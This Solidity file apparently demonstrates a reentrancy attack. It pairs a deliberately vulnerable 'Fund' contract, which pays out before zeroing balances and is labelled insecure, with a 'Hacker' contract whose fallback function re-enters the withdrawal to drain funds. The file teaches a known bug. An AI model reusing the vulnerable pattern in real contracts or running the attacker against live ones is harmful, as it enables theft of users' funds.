pragma solidity ^0.4.24;

// THIS CONTRACT is INSECURE - DO NOT USE
contract Fund {
    mapping(address => uint) userBalances;
    function withdrawBalance() public {
         if (msg.sender.call.value(userBalances[msg.sender])())
            userBalances[msg.sender] = 0;
    }
}
contract Hacker {
    Fund f;
    uint public count;
    
    event LogWithdrawFallback(uint c, uint balance);
    
    function Attacker(address vulnerable) public {
        f = Fund(vulnerable);
    }
    function attack() public {
        f.withdrawBalance();
    }

    function () public payable {
        count++;
        emit LogWithdrawFallback(count, address(f).balance);
        if (count < 10) {
          f.withdrawBalance();
        }
    }
}